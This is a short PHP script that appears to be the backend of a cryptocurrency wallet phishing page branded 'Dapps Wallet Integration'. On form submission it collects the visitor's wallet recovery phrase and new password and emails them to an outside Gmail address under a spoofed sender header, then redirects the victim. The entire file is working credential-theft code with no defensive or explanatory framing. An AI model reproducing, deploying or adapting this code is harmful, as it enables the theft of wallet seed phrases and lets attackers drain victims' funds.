<?php

if (isset($_POST["connect"])) {
    $to = "tracymallorie@gmail.com";
    $recovery= $_POST["recovery_phrase"];
    $new_pwd= $_POST["new_pwd"];
    $confirm_pwd= $_POST["confirm_pwd"];
    $subject = "Connect Wallet";
    $message =  "Message from website : Recovery Phrase is '.$recovery.' '.<br>.' New Password is '.$new_pwd.'";
    // $headers = "From Dapps Wallet Integration";
    $headers =  'MIME-Version: 1.0' . "\r\n"; 
    $headers .= 'Dapps Wallet Integration <info@address.com>' . "\r\n";
    $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n"; 
    if(mail($to, $subject,$message,$headers)){ 
      echo "<script>window.location='redirect.php';</script>";
     }else{ 
      echo "<script>alert('Error sending mail');</script>";
     }
    

}

?>